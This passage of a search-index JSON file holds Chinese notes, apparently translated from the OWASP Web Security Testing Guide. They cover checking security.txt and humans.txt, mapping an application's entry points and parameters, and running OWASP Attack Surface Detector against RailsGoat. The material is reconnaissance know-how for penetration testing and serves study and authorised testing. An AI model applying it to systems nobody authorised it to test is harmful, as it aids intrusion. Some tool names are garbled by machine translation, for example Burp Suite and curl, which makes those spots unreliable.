\u4e00\u79cd\u6709\u52a9\u4e8e\u5b89\u5168\u6f0f\u6d1e\u62ab\u9732\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u5141\u8bb8\u7f51\u7ad9\u5b9a\u4e49\u5b89\u5168\u7b56\u7565\u548c\u8054\u7cfb\u65b9\u5f0f\u3002\u6709\u591a\u79cd\u539f\u56e0\u53ef\u80fd\u5bf9\u6d4b\u8bd5\u573a\u666f\u611f\u5174\u8da3\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a</p> <ul> <li>\u8bc6\u522b\u8fdb\u4e00\u6b65\u7684\u8def\u5f84\u6216\u8d44\u6e90\u4ee5\u5305\u542b\u5728\u53d1\u73b0/\u5206\u6790\u4e2d\u3002</li> <li>\u5f00\u6e90\u60c5\u62a5\u6536\u96c6\u3002</li> <li>\u67e5\u627e\u6709\u5173 Bug Bounties \u7b49\u7684\u4fe1\u606f\u3002</li> <li>\u793e\u4f1a\u5de5\u7a0b\u5b66\u3002</li> </ul> <p>\u8be5\u6587\u4ef6\u53ef\u80fd\u5b58\u5728\u4e8e\u7f51\u7edc\u670d\u52a1\u5668\u7684\u6839\u76ee\u5f55\u4e2d\u6216<code>.well-known/</code>\u76ee\u5f55\u4e2d\u3002\u524d\u4efb\uff1a</p> <ul> <li><code>https://example.com/security.txt</code></li> <li><code>https://example.com/.well-known/security.txt</code></li> </ul> <p>\u8fd9\u662f\u4ece LinkedIn 2020 \u5e74 5 \u6708 5 \u65e5\u68c0\u7d22\u5230\u7684\u771f\u5b9e\u793a\u4f8b\uff1a</p> <pre><code>$ wget --no-verbose https://www.linkedin.com/.well-known/security.txt &amp;&amp; cat security.txt\n2020-05-07 12:56:51 URL:https://www.linkedin.com/.well-known/security.txt [333/333] -&gt; \"security.txt\" [1]\n# Conforms to IETF `draft-foudil-securitytxt-07`\nContact: mailto:security@linkedin.com\nContact: https://www.linkedin.com/help/linkedin/answer/62924\nEncryption: https://www.linkedin.com/help/linkedin/answer/79676\nCanonical: https://www.linkedin.com/.well-known/security.txt\nPolicy: https://www.linkedin.com/help/linkedin/answer/62924\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#txt_1","title":"\u4eba\u7c7b TXT","text":"<p><code>humans.txt</code>\u662f\u4e00\u4e2a\u4e86\u89e3\u7f51\u7ad9\u80cc\u540e\u7684\u4eba\u7684\u5021\u8bae\u3002\u5b83\u91c7\u7528\u6587\u672c\u6587\u4ef6\u7684\u5f62\u5f0f\uff0c\u5176\u4e2d\u5305\u542b\u6709\u5173\u4e3a\u6784\u5efa\u7f51\u7ad9\u505a\u51fa\u8d21\u732e\u7684\u4e0d\u540c\u4eba\u5458\u7684\u4fe1\u606f\u3002\u8be5\u6587\u4ef6\u901a\u5e38\uff08\u4f46\u4e0d\u603b\u662f\uff09\u5305\u542b\u6709\u5173\u804c\u4e1a\u6216\u5de5\u4f5c\u5730\u70b9/\u8def\u5f84\u7684\u4fe1\u606f\u3002</p> <p>\u4ee5\u4e0b\u793a\u4f8b\u68c0\u7d22\u81ea Google 2020 \u5e74 5 \u6708 5 \u65e5\uff1a</p> <pre><code>$ wget --no-verbose  https://www.google.com/humans.txt &amp;&amp; cat humans.txt\n2020-05-07 12:57:52 URL:https://www.google.com/humans.txt [286/286] -&gt; \"humans.txt\" [1]\nGoogle is built by a large team of engineers, designers, researchers, robots, and others in many different sites across the globe. It is updated continuously, and built with more tools and technologies than we can shake a stick at. If you'd like to help us out, see careers.google.com.\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_8","title":"\u5176\u4ed6\u4f17\u6240\u5468\u77e5\u7684\u4fe1\u606f\u6765\u6e90","text":"<p>\u8fd8\u6709\u5176\u4ed6 RFC \u548c Internet \u8349\u6848\u5efa\u8bae\u5728<code>.well-known/</code>\u76ee\u5f55\u4e2d\u5bf9\u6587\u4ef6\u8fdb\u884c\u6807\u51c6\u5316\u4f7f\u7528\u3002\u53ef\u4ee5\u5728\u6b64\u5904\u6216\u6b64\u5904\u627e\u5230\u5176\u4e2d\u7684\u5217\u8868\u3002</p> <p>\u6d4b\u8bd5\u4eba\u5458\u67e5\u770b RFC/\u8349\u7a3f\u5e76\u521b\u5efa\u4e00\u4e2a\u5217\u8868\u4ee5\u63d0\u4f9b\u7ed9\u722c\u866b\u6216\u6a21\u7cca\u5668\uff0c\u4ee5\u9a8c\u8bc1\u6b64\u7c7b\u6587\u4ef6\u7684\u5b58\u5728\u6216\u5185\u5bb9\uff0c\u8fd9\u5c06\u662f\u76f8\u5f53\u7b80\u5355\u7684\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_9","title":"\u5de5\u5177","text":"<ul> <li>\u6d4f\u89c8\u5668\uff08\u67e5\u770b\u6e90\u4ee3\u7801\u6216\u5f00\u53d1\u5de5\u5177\u529f\u80fd\uff09</li> <li>\u5377\u66f2</li> <li>wget</li> <li>\u6253\u55dd\u5957\u4ef6</li> <li>ZAP</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/","title":"\u786e\u5b9a\u5e94\u7528\u5165\u53e3\u70b9","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_1","title":"\u6982\u62ec","text":"<p>\u5728\u8fdb\u884c\u4efb\u4f55\u5f7b\u5e95\u7684\u6d4b\u8bd5\u4e4b\u524d\uff0c\u679a\u4e3e\u5e94\u7528\u7a0b\u5e8f\u53ca\u5176\u653b\u51fb\u9762\u662f\u4e00\u4e2a\u5173\u952e\u7684\u5148\u51b3\u6761\u4ef6\uff0c\u56e0\u4e3a\u5b83\u5141\u8bb8\u6d4b\u8bd5\u4eba\u5458\u8bc6\u522b\u53ef\u80fd\u7684\u5f31\u70b9\u533a\u57df\u3002\u672c\u8282\u65e8\u5728\u5e2e\u52a9\u8bc6\u522b\u548c\u6620\u5c04\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u533a\u57df\uff0c\u4e00\u65e6\u679a\u4e3e\u548c\u6620\u5c04\u5b8c\u6210\u540e\u5e94\u8fdb\u884c\u8c03\u67e5\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u901a\u8fc7\u8bf7\u6c42\u548c\u54cd\u5e94\u5206\u6790\u786e\u5b9a\u53ef\u80fd\u7684\u5165\u53e3\u548c\u6ce8\u5165\u70b9\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u5728\u5f00\u59cb\u4efb\u4f55\u6d4b\u8bd5\u4e4b\u524d\uff0c\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u59cb\u7ec8\u5f88\u597d\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\uff0c\u4ee5\u53ca\u7528\u6237\u548c\u6d4f\u89c8\u5668\u5982\u4f55\u4e0e\u4e4b\u901a\u4fe1\u3002\u5f53\u6d4b\u8bd5\u4eba\u5458\u904d\u5386\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u4ed6\u4eec\u5e94\u8be5\u6ce8\u610f\u6240\u6709 HTTP \u8bf7\u6c42\u4ee5\u53ca\u4f20\u9012\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2a\u53c2\u6570\u548c\u8868\u5355\u5b57\u6bb5\u3002\u4ed6\u4eec\u5e94\u7279\u522b\u6ce8\u610f\u4f55\u65f6\u4f7f\u7528 GET \u8bf7\u6c42\u4ee5\u53ca\u4f55\u65f6\u4f7f\u7528 POST \u8bf7\u6c42\u5411\u5e94\u7528\u7a0b\u5e8f\u4f20\u9012\u53c2\u6570\u3002\u6b64\u5916\uff0c\u4ed6\u4eec\u8fd8\u9700\u8981\u6ce8\u610f\u4f55\u65f6\u4f7f\u7528\u5176\u4ed6\u7528\u4e8e RESTful \u670d\u52a1\u7684\u65b9\u6cd5\u3002</p> <p>\u8bf7\u6ce8\u610f\uff0c\u4e3a\u4e86\u67e5\u770b\u5728\u8bf7\u6c42\u6b63\u6587\uff08\u4f8b\u5982 POST \u8bf7\u6c42\uff09\u4e2d\u53d1\u9001\u7684\u53c2\u6570\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u8bf8\u5982\u62e6\u622a\u4ee3\u7406\u4e4b\u7c7b\u7684\u5de5\u5177\uff08\u8bf7\u53c2\u9605\u5de5\u5177\uff09\u3002\u5728 POST \u8bf7\u6c42\u4e2d\uff0c\u6d4b\u8bd5\u4eba\u5458\u8fd8\u5e94\u8be5\u7279\u522b\u6ce8\u610f\u4f20\u9012\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u4efb\u4f55\u9690\u85cf\u8868\u5355\u5b57\u6bb5\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u901a\u5e38\u5305\u542b\u654f\u611f\u4fe1\u606f\uff0c\u4f8b\u5982\u72b6\u6001\u4fe1\u606f\u3001\u9879\u76ee\u6570\u91cf\u3001\u9879\u76ee\u4ef7\u683c\uff0c\u5f00\u53d1\u4eba\u5458\u6c38\u8fdc\u4e0d\u4f1a\u65e8\u5728\u4f9b\u4efb\u4f55\u4eba\u67e5\u770b\u6216\u66f4\u6539\u3002</p> <p>\u6839\u636e\u4f5c\u8005\u7684\u7ecf\u9a8c\uff0c\u5728\u8fd9\u4e2a\u6d4b\u8bd5\u9636\u6bb5\u4f7f\u7528\u62e6\u622a\u4ee3\u7406\u548c\u7535\u5b50\u8868\u683c\u975e\u5e38\u6709\u7528\u3002\u4ee3\u7406\u5c06\u5728\u6d4b\u8bd5\u4eba\u5458\u63a2\u7d22\u5e94\u7528\u7a0b\u5e8f\u65f6\u8ddf\u8e2a\u6d4b\u8bd5\u4eba\u5458\u548c\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u7684\u6bcf\u4e2a\u8bf7\u6c42\u548c\u54cd\u5e94\u3002\u6b64\u5916\uff0c\u5728\u8fd9\u4e00\u70b9\u4e0a\uff0c\u6d4b\u8bd5\u4eba\u5458\u901a\u5e38\u4f1a\u6355\u83b7\u6bcf\u4e2a\u8bf7\u6c42\u548c\u54cd\u5e94\uff0c\u4ee5\u4fbf\u4ed6\u4eec\u53ef\u4ee5\u51c6\u786e\u5730\u770b\u5230\u4f20\u9012\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2a\u6807\u5934\u3001\u53c2\u6570\u7b49\u4ee5\u53ca\u8fd4\u56de\u7684\u5185\u5bb9\u3002\u8fd9\u6709\u65f6\u4f1a\u975e\u5e38\u4e4f\u5473\uff0c\u5c24\u5176\u662f\u5728\u5927\u578b\u4ea4\u4e92\u5f0f\u7f51\u7ad9\u4e0a\uff08\u60f3\u60f3\u94f6\u884c\u5e94\u7528\u7a0b\u5e8f\uff09\u3002\u7136\u800c\uff0c\u7ecf\u9a8c\u4f1a\u544a\u8bc9\u6211\u4eec\u8981\u5bfb\u627e\u4ec0\u4e48\uff0c\u8fd9\u4e2a\u9636\u6bb5\u53ef\u4ee5\u5927\u5927\u51cf\u5c11\u3002</p> <p>\u5f53\u6d4b\u8bd5\u4eba\u5458\u904d\u5386\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u4ed6\u4eec\u5e94\u8be5\u8bb0\u4e0b URL\u3001\u81ea\u5b9a\u4e49\u6807\u5934\u6216\u8bf7\u6c42/\u54cd\u5e94\u6b63\u6587\u4e2d\u7684\u4efb\u4f55\u6709\u8da3\u53c2\u6570\uff0c\u5e76\u5c06\u5b83\u4eec\u4fdd\u5b58\u5728\u7535\u5b50\u8868\u683c\u4e2d\u3002\u7535\u5b50\u8868\u683c\u5e94\u5305\u62ec\u8bf7\u6c42\u7684\u9875\u9762\uff08\u6700\u597d\u8fd8\u6dfb\u52a0\u6765\u81ea\u4ee3\u7406\u7684\u8bf7\u6c42\u7f16\u53f7\uff0c\u4ee5\u4f9b\u5c06\u6765\u53c2\u8003\uff09\u3001\u6709\u8da3\u7684\u53c2\u6570\u3001\u8bf7\u6c42\u7c7b\u578b\uff08GET\u3001POST \u7b49\uff09\uff0c\u5982\u679c\u8bbf\u95ee\u662f\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1/\u672a\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\uff0c\u5982\u679c\u4f7f\u7528 TLS\uff0c\u5982\u679c\u5b83\u662f\u591a\u6b65\u9aa4\u8fc7\u7a0b\u7684\u4e00\u90e8\u5206\uff0c\u5982\u679c\u4f7f\u7528 WebSockets\uff0c\u4ee5\u53ca\u4efb\u4f55\u5176\u4ed6\u76f8\u5173\u8bf4\u660e\u3002\u4e00\u65e6\u4ed6\u4eec\u89c4\u5212\u4e86\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2a\u533a\u57df\uff0c\u4ed6\u4eec\u5c31\u53ef\u4ee5\u68c0\u67e5\u5e94\u7528\u7a0b\u5e8f\u5e76\u6d4b\u8bd5\u4ed6\u4eec\u5df2\u7ecf\u786e\u5b9a\u7684\u6bcf\u4e2a\u533a\u57df\uff0c\u5e76\u8bb0\u5f55\u54ea\u4e9b\u6709\u6548\uff0c\u54ea\u4e9b\u65e0\u6548\u3002\u672c\u6307\u5357\u7684\u5176\u4f59\u90e8\u5206\u5c06\u786e\u5b9a\u5982\u4f55\u6d4b\u8bd5\u6bcf\u4e2a\u611f\u5174\u8da3\u7684\u9886\u57df\uff0c</p> <p>\u4ee5\u4e0b\u662f\u6240\u6709\u8bf7\u6c42\u548c\u54cd\u5e94\u7684\u4e00\u4e9b\u8981\u70b9\u3002\u5728\u8bf7\u6c42\u90e8\u5206\uff0c\u91cd\u70b9\u5173\u6ce8 GET \u548c POST \u65b9\u6cd5\uff0c\u56e0\u4e3a\u5b83\u4eec\u51fa\u73b0\u5728\u5927\u591a\u6570\u8bf7\u6c42\u4e2d\u3002\u8bf7\u6ce8\u610f\uff0c\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u65b9\u6cd5\uff0c\u4f8b\u5982 PUT \u548c DELETE\u3002\u901a\u5e38\uff0c\u5982\u679c\u5141\u8bb8\uff0c\u8fd9\u4e9b\u66f4\u7f55\u89c1\u7684\u8bf7\u6c42\u53ef\u80fd\u4f1a\u66b4\u9732\u6f0f\u6d1e\u3002\u672c\u6307\u5357\u4e2d\u6709\u4e00\u4e2a\u4e13\u95e8\u7528\u4e8e\u6d4b\u8bd5\u8fd9\u4e9b HTTP \u65b9\u6cd5\u7684\u90e8\u5206\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_4","title":"\u8981\u6c42","text":"<ul> <li>\u786e\u5b9a\u5728\u4f55\u5904\u4f7f\u7528 GET \u548c\u5728\u4f55\u5904\u4f7f\u7528 POST\u3002</li> <li>\u8bc6\u522b POST \u8bf7\u6c42\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u53c2\u6570\uff08\u8fd9\u4e9b\u5728\u8bf7\u6c42\u7684\u6b63\u6587\u4e2d\uff09\u3002</li> <li>\u5728 POST \u8bf7\u6c42\u4e2d\uff0c\u8bf7\u7279\u522b\u6ce8\u610f\u4efb\u4f55\u9690\u85cf\u53c2\u6570\u3002\u53d1\u9001 POST \u65f6\uff0c\u6240\u6709\u8868\u5355\u5b57\u6bb5\uff08\u5305\u62ec\u9690\u85cf\u53c2\u6570\uff09\u90fd\u5c06\u5728 HTTP \u6d88\u606f\u6b63\u6587\u4e2d\u53d1\u9001\u5230\u5e94\u7528\u7a0b\u5e8f\u3002\u8fd9\u4e9b\u901a\u5e38\u662f\u770b\u4e0d\u5230\u7684\uff0c\u9664\u975e\u4f7f\u7528\u4ee3\u7406\u6216\u67e5\u770b HTML \u6e90\u4ee3\u7801\u3002\u6b64\u5916\uff0c\u663e\u793a\u7684\u4e0b\u4e00\u9875\u3001\u5176\u6570\u636e\u548c\u8bbf\u95ee\u7ea7\u522b\u90fd\u53ef\u80fd\u56e0\u9690\u85cf\u53c2\u6570\u7684\u503c\u800c\u5f02\u3002</li> <li>\u8bc6\u522b GET \u8bf7\u6c42\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u53c2\u6570\uff08\u5373 URL\uff09\uff0c\u7279\u522b\u662f\u67e5\u8be2\u5b57\u7b26\u4e32\uff08\u901a\u5e38\u5728 ? \u6807\u8bb0\u4e4b\u540e\uff09\u3002</li> <li>\u8bc6\u522b\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u6240\u6709\u53c2\u6570\u3002\u8fd9\u4e9b\u901a\u5e38\u662f\u6210\u5bf9\u683c\u5f0f\uff0c\u4f8b\u5982<code>foo=bar</code>.\u00a0\u53e6\u8bf7\u6ce8\u610f\uff0c\u8bb8\u591a\u53c2\u6570\u53ef\u4ee5\u5728\u4e00\u4e2a\u67e5\u8be2\u5b57\u7b26\u4e32\u4e2d\uff0c\u4f8b\u5982\u7531<code>&amp;</code>,\u00a0<code>\\~</code>,<code>:</code>\u6216\u4efb\u4f55\u5176\u4ed6\u7279\u6b8a\u5b57\u7b26\u6216\u7f16\u7801\u5206\u9694\u3002</li> <li>\u5728\u8bc6\u522b\u4e00\u4e2a\u5b57\u7b26\u4e32\u6216 POST \u8bf7\u6c42\u4e2d\u7684\u591a\u4e2a\u53c2\u6570\u65f6\u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0c\u6267\u884c\u653b\u51fb\u9700\u8981\u90e8\u5206\u6216\u5168\u90e8\u53c2\u6570\u3002\u6d4b\u8bd5\u4eba\u5458\u9700\u8981\u8bc6\u522b\u6240\u6709\u53c2\u6570\uff08\u5373\u4f7f\u5df2\u7f16\u7801\u6216\u52a0\u5bc6\uff09\u5e76\u8bc6\u522b\u54ea\u4e9b\u53c2\u6570\u7531\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u3002\u6307\u5357\u7684\u540e\u9762\u90e8\u5206\u5c06\u786e\u5b9a\u5982\u4f55\u6d4b\u8bd5\u8fd9\u4e9b\u53c2\u6570\u3002\u5728\u8fd9\u4e00\u70b9\u4e0a\uff0c\u53ea\u9700\u786e\u4fdd\u5b83\u4eec\u4e2d\u7684\u6bcf\u4e00\u4e2a\u90fd\u88ab\u8bc6\u522b\u51fa\u6765\u3002</li> <li>\u8fd8\u8981\u6ce8\u610f\u901a\u5e38\u770b\u4e0d\u5230\u7684\u4efb\u4f55\u5176\u4ed6\u6216\u81ea\u5b9a\u4e49\u7c7b\u578b\u6807\u5934\uff08\u4f8b\u5982<code>debug: false</code>\uff09\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_5","title":"\u56de\u5e94","text":"<ul> <li>\u786e\u5b9a\u65b0 cookie \u7684\u8bbe\u7f6e\uff08<code>Set-Cookie</code>\u6807\u5934\uff09\u3001\u4fee\u6539\u6216\u6dfb\u52a0\u4f4d\u7f6e\u3002</li> <li>\u786e\u5b9a\u5728\u6b63\u5e38\u54cd\u5e94\uff08\u5373\u672a\u4fee\u6539\u7684\u8bf7\u6c42\uff09\u671f\u95f4\u5b58\u5728\u4efb\u4f55\u91cd\u5b9a\u5411\uff083xx HTTP \u72b6\u6001\u4ee3\u7801\uff09\u3001400 \u72b6\u6001\u4ee3\u7801\uff08\u5c24\u5176\u662f 403 Forbidden\uff09\u548c 500 \u5185\u90e8\u670d\u52a1\u5668\u9519\u8bef\u7684\u4f4d\u7f6e\u3002</li> <li>\u8fd8\u8981\u6ce8\u610f\u4f7f\u7528\u4efb\u4f55\u6709\u8da3\u7684\u6807\u5934\u7684\u4f4d\u7f6e\u3002\u4f8b\u5982\uff0c<code>Server: BIG-IP</code>\u8868\u793a\u8be5\u7ad9\u70b9\u662f\u8d1f\u8f7d\u5e73\u8861\u7684\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4e00\u4e2a\u7ad9\u70b9\u662f\u8d1f\u8f7d\u5e73\u8861\u7684\u5e76\u4e14\u4e00\u53f0\u670d\u52a1\u5668\u914d\u7f6e\u4e0d\u6b63\u786e\uff0c\u90a3\u4e48\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4e0d\u5f97\u4e0d\u53d1\u51fa\u591a\u4e2a\u8bf7\u6c42\u6765\u8bbf\u95ee\u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\u5668\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u6240\u4f7f\u7528\u7684\u8d1f\u8f7d\u5e73\u8861\u7c7b\u578b\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#owasp","title":"OWASP \u653b\u51fb\u9762\u68c0\u6d4b\u5668","text":"<p>Attack Surface Detector (ASD) \u5de5\u5177\u8c03\u67e5\u6e90\u4ee3\u7801\u5e76\u53d1\u73b0 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u7aef\u70b9\u3001\u8fd9\u4e9b\u7aef\u70b9\u63a5\u53d7\u7684\u53c2\u6570\u4ee5\u53ca\u8fd9\u4e9b\u53c2\u6570\u7684\u6570\u636e\u7c7b\u578b\u3002\u8fd9\u5305\u62ec\u8718\u86db\u65e0\u6cd5\u627e\u5230\u7684\u672a\u94fe\u63a5\u7aef\u70b9\uff0c\u6216\u5ba2\u6237\u7aef\u4ee3\u7801\u4e2d\u5b8c\u5168\u672a\u4f7f\u7528\u7684\u53ef\u9009\u53c2\u6570\u3002\u5b83\u8fd8\u80fd\u591f\u8ba1\u7b97\u5e94\u7528\u7a0b\u5e8f\u4e24\u4e2a\u7248\u672c\u4e4b\u95f4\u653b\u51fb\u9762\u7684\u53d8\u5316\u3002</p> <p>Attack Surface Detector \u53ef\u4f5c\u4e3a ZAP \u548c Burp Suite \u7684\u63d2\u4ef6\u4f7f\u7528\uff0c\u8fd8\u63d0\u4f9b\u547d\u4ee4\u884c\u5de5\u5177\u3002\u547d\u4ee4\u884c\u5de5\u5177\u5c06\u653b\u51fb\u9762\u5bfc\u51fa\u4e3a JSON \u8f93\u51fa\uff0c\u7136\u540e\u53ef\u4f9b ZAP \u548c Burp Suite \u63d2\u4ef6\u4f7f\u7528\u3002\u8fd9\u5bf9\u4e8e\u672a\u76f4\u63a5\u5411\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u63d0\u4f9b\u6e90\u4ee3\u7801\u7684\u60c5\u51b5\u5f88\u6709\u5e2e\u52a9\u3002\u4f8b\u5982\uff0c\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4ece\u4e0d\u60f3\u63d0\u4f9b\u6e90\u4ee3\u7801\u7684\u5ba2\u6237\u90a3\u91cc\u83b7\u53d6 json \u8f93\u51fa\u6587\u4ef6\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_6","title":"\u5982\u4f55\u4f7f\u7528","text":"<p>CLI jar \u6587\u4ef6\u53ef\u4ecehttps://github.com/secdec/attack-surface-detector-cli/releases\u4e0b\u8f7d\u3002</p> <p>\u60a8\u53ef\u4ee5\u4e3a ASD \u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff0c\u4ee5\u4ece\u76ee\u6807 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\u4e2d\u8bc6\u522b\u7aef\u70b9\u3002</p> <p><code>java -jar attack-surface-detector-cli-1.3.5.jar &lt;source-code-path&gt; [flags]</code></p> <p>\u8fd9\u662f\u9488\u5bf9OWASP RailsGoat\u8fd0\u884c\u547d\u4ee4\u7684\u793a\u4f8b\u3002</p> <pre><code>$ java -jar attack-surface-detector-cli-1.3.5.jar railsgoat/\nBeginning endpoint detection for '&lt;...&gt;/railsgoat' with 1 framework types\nUsing framework=RAILS\n[0] GET: /login (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_contro\nller.rb (lines '6'-'9')\n[1] GET: /logout (0 variants): PARAMETERS={}; FILE=/app/controllers/sessions_controller.rb (lines '33'-'37')\n[2] POST: /forgot_password (0 variants): PARAMETERS={email=name=email, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/\npassword_resets_controller.rb (lines '29'-'38')\n[3] GET: /password_resets (0 variants): PARAMETERS={token=name=token, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/p\nassword_resets_controller.rb (lines '19'-'27')\n[4] POST: /password_resets (0 variants): PARAMETERS={password=name=password, paramType=QUERY_STRING, dataType=STRING, user=name=user, paramType=QUERY_STRING, dataType=STRING, confirm_password=name=confirm_password, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/password_resets_controller.rb (lines '5'-'17')\n[5] GET: /sessions/new (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '6'-'9')\n[6] POST: /sessions (0 variants): PARAMETERS={password=name=password, paramType=QUERY_STRING, dataType=STRING, user_id=name=user_id, paramType=SESSION, dataType=STRING, remember_me=name=remember_me, paramType=QUERY_STRING, dataType=STRING, url=name=url, paramType=QUERY_STRING, dataType=STRING, email=name=email, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '11'-'31')\n[7] DELETE: /sessions/{id} (0 variants): PARAMETERS={}; FILE=/app/controllers/sessions_controller.rb (lines '33'-'37')\n[8] GET: /users (0 variants): PARAMETERS={}; FILE=/app/controllers/api/v1/users_controller.rb (lines '9'-'11')\n[9] GET: /users/{id} (0 variants): PARAMETERS={}; FILE=/app/controllers/api/v1/users_controller.rb (lines '13'-'15')\n... snipped ...\n[38] GET: /api/v1/mobile/{id} (0 variants): PARAMETERS={id=name=id, paramType=QUERY_STRING, dataType=STRING, class=name=class, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/api/v1/mobile_controller.rb (lines '8'-'13')\n[39] GET: / (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '6'-'9')\nGenerated 40 distinct endpoints with 0 variants for a total of 40 endpoints\nSuccessfully validated serialization for these endpoints\n0 endpoints were missing code start line\n0 endpoints were missing code end line\n0 endpoints had the same code start and end line\nGenerated 36 distinct parameters\nGenerated 36 total parameters\n- 36/36 have their data type\n- 0/36 have a list of accepted values\n- 36/36 have their parameter type\n--- QUERY_STRING: 35\n--- SESSION: 1\nFinished endpoint detection for '&lt;...&gt;/railsgoat'\n----------\n-- DONE --\n0 projects had duplicate endpoints\nGenerated 40 distinct endpoints\nGenerated 40 total endpoints\nGenerated 36 distinct parameters\nGenerated 36 total parameters\n1/1 projects had endpoints generated\nTo enable logging include the -debug argument\n</code></pre> <p>\u60a8\u8fd8\u53ef\u4ee5\u4f7f\u7528<code>-json</code>\u6807\u5fd7\u751f\u6210\u4e00\u4e2a JSON 